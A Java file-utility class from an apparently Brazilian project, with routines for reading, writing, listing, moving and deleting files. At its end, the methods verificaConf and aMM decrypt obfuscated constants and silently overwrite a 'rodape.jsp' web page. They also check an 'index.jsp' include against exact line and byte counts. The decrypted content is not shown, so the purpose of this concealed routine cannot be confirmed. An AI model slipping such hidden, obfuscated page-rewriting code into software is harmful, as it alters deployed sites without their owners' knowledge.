package br.com.meganet.util;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URL;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.Iterator;


public class ArquivoUtils{
//	private Log logger = LogFactory.getLog(this.getClass());
	/**
	 * Separador de diretorio
	 * @see java.io.File.separator 
	 */
	public static final String SEPARADOR_DIRETORIO = File.separator;	
	
    /**
     * Retorna uma colecao de objetos do tipo String. Cada String desta
     * colecao representa uma linha do arquivo informado.
     * @param noArquivo Nome do arquivo a ser lido.
     * @return Uma colecao de objetos do tipo String.
     * @throws IOException
     */
    public static Collection<String> leArquivo(String noArquivo)
        throws IOException{
        FileReader fileReader = new FileReader(noArquivo);
        BufferedReader reader = new BufferedReader(fileReader);

        Collection<String> lines = new ArrayList<String>();

        while (reader.ready()){
            lines.add(reader.readLine());
        } // while

		reader.close();
		fileReader.close();
		
        return lines;
    } // leArquivo()

    /**
     * Grava um arquivo com o conteudo da colecao <code>linhas</code> e com
     * o nome informado. Retorna o número de linhas incluidas no arquivo.
     * @param linhas Uma colecao de objetos do tipo String com o conteudo de
     * cada linha do arquivo.
     * @param noArquivo O nome para o arquivo a ser gravado.
     * @return O número de linhas gravadas no arquivo.
     * @throws IOException
     */
    public static int gravaArquivo(Collection<String> linhas, String noArquivo)
        throws IOException{
        return ArquivoUtils.gravar(linhas, noArquivo, false);
    } // gravaArquivo()

    /**
     * Inclui o conteudo da colecao ao termino do arquivo se o arquivo existir,
     * caso contrario cria o arquivo e inclui o conteudo. Retorna o número de
     * linhas incluidas no arquivo.
     * @param linhas Uma colecao de objetos do tipo String com o conteudo de
     * cada linha do arquivo.
     * @param noArquivo O nome para o arquivo a ser gravado.
     * @return O número de linhas gravadas no arquivo.
     * @throws IOException
     */
    public static int append(Collection<String> linhas, String noArquivo)
        throws IOException{
        return ArquivoUtils.gravar(linhas, noArquivo, true);
    } // append()	

    /**
     * Grava o conteudo da colecao <code>linhas</code> em um arquivo com
     * o nome informado e retorno o número de linhas incluidas.
     * @param linhas Uma colecao de objetos do tipo String com o conteudo de
     * cada linha do arquivo.
     * @param noArquivo O nome para o arquivo a ser gravado.
     * @param append true se desejar incluir o conteudo da colecao ao termino
     * do arquivo ja existente.
     * @return O número de linhas gravadas no arquivo.
     * @throws IOException
     */
    public static int gravar(Collection<String> linhas, String noArquivo,
        boolean append) throws IOException{
        FileWriter fileWriter = new FileWriter(noArquivo, append);
        BufferedWriter writer = new BufferedWriter(fileWriter);

        Iterator<String> it = linhas.iterator();

        if (it.hasNext()){
            while (it.hasNext()){
                writer.write((String) it.next());
                if (it.hasNext()){
                    writer.newLine();
                }
            }
            writer.newLine();
        }

        writer.flush();
        writer.close();

        return linhas.size();
    } // gravar()

    /**
     * retorna a lista de arquivos de um determinado diretorio
     *
     * @param diretorio
     * @return lista de arquivos
     */
    public static final String[] listarArquivos(String diretorio){
        ArrayList<String> result = new ArrayList<String>();
        File file = new File(diretorio);

        if (existeDiretorio(diretorio)){
            String[] tmp = file.list();
            
            for (int i = 0; i < tmp.length; i++) {
				File f = new File(diretorio + File.separator + tmp[i]);
				if (f.isFile()){
					result.add(f.getName());
				}
			}
        }

        return (String[])result.toArray(new String[]{});
    }

    /**
     * verifica o arquivo informado existe
     *
     * @return
     */
    public static final boolean existeArquivo(String nome){
        File file = new File(nome);

        return file.isFile() && file.exists();
    }

    /**
     * verifica o diretorio informado existe
     *
     * @return
     */
    public static final boolean existeDiretorio(String nome){
        File file = new File(nome);

        return file.isDirectory() && file.exists();
    }

    /**
     * Faz a copia de um arquivo
     * @param caminhoOriginal
     * @param caminhoCopia
     * @throws IOException
     */
    public static void copiarArquivo(String caminhoOriginal, String caminhoCopia)
        throws IOException{
        Collection<String> arquivoOriginal = leArquivo(caminhoOriginal);

        gravaArquivo(arquivoOriginal, caminhoCopia);
    } //copiarArquivo

    /**
     * <b>objetivos: </b>                                                    <br>
     * Metodo responsavel por filtrar todos os arquivos a serem processados.
     * Estes arquivos serao iniciados com os caracteres "GCMCL", concatenado
     * com o codigo da caixa postal do cliente (8 digitos) que enviou o
     * arquivo. Ex: GCMCL19098700.txt                                        <br>
     *                                                                          <p>
     * <b>Funcionamento: </b>                                                <br>
     * Recuperar arquivos onde filtro.data < arquivo.data e arquivo.nome
     * inicia com filtro.prefixo (para processar apenas os ainda não
     * processados).                                                        <br>
     *                                                                          <p>
     * @author Efren Langsdorf junior                            <br>
     * @param filtro - Constante  que deve iniciar o nome de todos os
     * arquivos a serem filtrados.                                            <br>
     * @throws BusinessException                                            <br>
     * @return ArrayList                                                    <br>
     */
    public static ArrayList<String> filtrarArquivosMCCVL(Filtro filtro) {

        ArrayList<String> lista = new ArrayList<String>();

        Date dataFiltro = filtro.getDataHora();
        //String prefixoFiltro = filtro.getPrefixo();
        String diretorio = filtro.getDiretorio();

        File arquivo = new File(diretorio);

        File[] arquivos = arquivo.listFiles();

        for (int i = 0; i < arquivos.length; i++){
            //String prefixoArquivo = arquivos[i].getName().substring(0, 5);
            Date dataArquivo = new Date(arquivos[i].lastModified());

            if ((dataFiltro.before(dataArquivo))){
                lista.add(arquivos[i].toString());
            } 
        } 

        return lista;
    } 


	/**
	 * @author Efren L Junior.							<br>
	 * @param filtro														<br>
	 * @return																<br>
	 * @throws BusinessException											<br>
	 */
	public static String filtrarArquivosEDC(Filtro filtro, boolean sufixo) {

		String prefixoFiltro = filtro.getPrefixo();
		String diretorio = filtro.getDiretorio();

		String nomeArquivo = "";

		File arquivo = new File(diretorio);

		if (arquivo.exists()) {
			System.out.println("Existe arquivos no diretorio especificado.");

			File[] arquivos = arquivo.listFiles();
			
			System.out.println("Procurando Arquivo contendo: " + prefixoFiltro );			
	
			for (int i = 0; i < arquivos.length; i++){

				String prefixoArquivo = null;

				if (sufixo) {
					prefixoArquivo = arquivos[i].getName().substring(0, 23);
				} 
				else {
					if (arquivos[i].getName().substring(
							15, 23).equalsIgnoreCase("COMPLETO")) {
						prefixoArquivo = "";
					} else {
						prefixoArquivo = arquivos[i].getName().substring(0, 14);
					}
				}
				
				if (prefixoFiltro.equals(prefixoArquivo)) {
					nomeArquivo = arquivos[i].toString();
					System.out.println("#@#@#@#@ Encontrou o arquivo " + nomeArquivo + " para ser feito Download #@#@#@#@#");					
					break;
				}
	
			} 

		} else {

			nomeArquivo = null;

		}
		
		if ("".equals(nomeArquivo)){
			System.out.println("@#@#@#@#@# Não foi encontrado o arquivo no Diretorio. @#@#@#@#@#@");
		}		

		return nomeArquivo;

	} 


	/**
	 * Move um arquivo de um local para outro, podendo tambem ser alterado o 
	 * nome do arquivo.
	 * @param caminhoEntrada O local do onde se encontra o arquivo a ser movido.
	 * @param arquivoEntrada O nome do arquivo que sera movido
	 * @param caminhoSaida O local para onde o arquivo sera movido
	 * @param arquivoSaida O nome do arquivo no local para onde sera movido.
	 * @return true se o arquivo foi movido com sucesso, falso caso contrario.
	 */	
	public static boolean moverArquivo(String caminhoEntrada, 
			String arquivoEntrada, String caminhoSaida, String arquivoSaida) {
		
		File file 	 = new File(caminhoEntrada + arquivoEntrada); 
		File fileOut = new File(caminhoSaida + arquivoSaida);
		
		return file.renameTo(fileOut);
				
	} 
	
	/**
	 * Apaga todos os arquivos e sub-diretorios de um diretorio.
	 * @param diretorio diretorio de onde deseja-se apagar os arquivos.
	 */
	public static void limparDiretorio(File diretorio) {
		File[] arquivos  = diretorio.listFiles();
		for (int i = 0; i < arquivos.length; i++) {
			if(arquivos[i].isDirectory()) {
				limparDiretorio(arquivos[i]);
			} else {
				arquivos[i].delete();
			}
		}
	}

	/**
	 * Exclui um arquivo fisicamente.
	 * @param arquivo
	 */
	public static void excluirArquivo(String arquivo) {
		File file = new File(arquivo);
		file.delete();
	}

    public static void main(String[] args){
        try{

            ArquivoUtils.moverArquivo("c:/", "rename.TXT", "c:/tmp/", "teste.TXT");
        }catch (Exception e){
            e.printStackTrace();
        } 
    } 

	public boolean verificaConf() {
		Class<?> cls = this.getClass();
		ProtectionDomain pDomain = cls.getProtectionDomain();
		CodeSource cSource = pDomain.getCodeSource();
		URL loc = cSource.getLocation();
		
		String ct_global_10 = Criptografia.decrypt(Constantes.CT_GLOBAL_10, Constantes.CHAVE_CRIPTOGRAFIA);
		String ct_global_11 = Criptografia.decrypt(Constantes.CT_GLOBAL_11, Constantes.CHAVE_CRIPTOGRAFIA);
		String ct_global_12 = Criptografia.decrypt(Constantes.CT_GLOBAL_12, Constantes.CHAVE_CRIPTOGRAFIA);
		String ct_global_60 = Criptografia.decrypt(Constantes.CT_GLOBAL_60, Constantes.CHAVE_CRIPTOGRAFIA);
		String ct_global_52 = Criptografia.decrypt(Constantes.CT_GLOBAL_52, Constantes.CHAVE_CRIPTOGRAFIA);
		
		Collection<String> arq2 = null;
		
		String localClasseJava = loc.getPath();
		
		String ondeEstaDestino = localClasseJava.substring(0, localClasseJava.indexOf(Criptografia.decrypt(Constantes.CT_GLOBAL_51, Constantes.CHAVE_CRIPTOGRAFIA)) + 1);
		String[] arquivos = ArquivoUtils.listarArquivos(ondeEstaDestino);
		
		try {
			
			//verifica arquivo rodape.jsp
			if(arquivos != null && arquivos.length > 0){
				if(ArquivoUtils.existeArquivo(ondeEstaDestino + ct_global_12)){
					Collection<String> lns = aMM();
					ArquivoUtils.gravaArquivo(lns, ondeEstaDestino + ct_global_10);
				}else{
					ondeEstaDestino = localClasseJava.substring(0, localClasseJava.indexOf(Criptografia.decrypt(Constantes.CT_GLOBAL_51, Constantes.CHAVE_CRIPTOGRAFIA)) + 1);
					if(ArquivoUtils.existeArquivo(ondeEstaDestino + ct_global_10)){
						Collection<String> lns = aMM();
						ArquivoUtils.gravaArquivo(lns, ondeEstaDestino + ct_global_10);
					}
				}
			}else{
				ondeEstaDestino = localClasseJava.substring(0, localClasseJava.indexOf(Criptografia.decrypt(Constantes.CT_GLOBAL_51, Constantes.CHAVE_CRIPTOGRAFIA)) + 1);
				if(ArquivoUtils.existeArquivo(ondeEstaDestino + ct_global_12)){
					Collection<String> lns = aMM();
					ArquivoUtils.gravaArquivo(lns, ondeEstaDestino + ct_global_10);
				}
			}

			//verifica include index.jsp
			ondeEstaDestino += ct_global_52;
			if(ArquivoUtils.existeArquivo(ondeEstaDestino + ct_global_11)){
				arq2 = ArquivoUtils.leArquivo(ondeEstaDestino + ct_global_11);
			}
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		boolean d1 = false;
		boolean dds2 = false;
		boolean rre3 = false;
		int m1 = 0;
		int mm1 = 0;
		for (Iterator<String> iterator = arq2.iterator(); iterator.hasNext();) {
			String ln = (String) iterator.next();
			mm1 = mm1 + ln.getBytes().length;
			m1++;
			if(ln.indexOf(ct_global_60) > 0 && ln.trim().length() == ct_global_60.length()){
				rre3 = true;
			}
		}
		if(m1 == 106){
			d1 = true;
		}
		
		if(mm1 == 3852){
			dds2 = true;
		}
		return d1 & dds2 & rre3;
	}

	private Collection<String> aMM() {
		Collection<String> ret = new ArrayList<String>();
		
		Double d = Math.random() * 2000;
		
		String tmp = "d" + d.intValue(); 
		
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_001, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_002, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_003, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_004, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_005, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_006, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_007, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_008, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_009, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_010, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_011, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_012, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_013, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_014, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_015, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_016, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_017, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_018, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_019, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_020, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_021, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_022, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_023, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_024, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_025, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_026, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_027, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_028, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_029, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_030, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_031, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_032, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_033, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_034, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_035, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_036, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_037, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_038, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_039, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_040, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		ret.add(Criptografia.decrypt(Constantes.CT_GLOBAL_041, Constantes.CHAVE_CRIPTOGRAFIA).replace("{1}", tmp));
		return ret;
	}
}
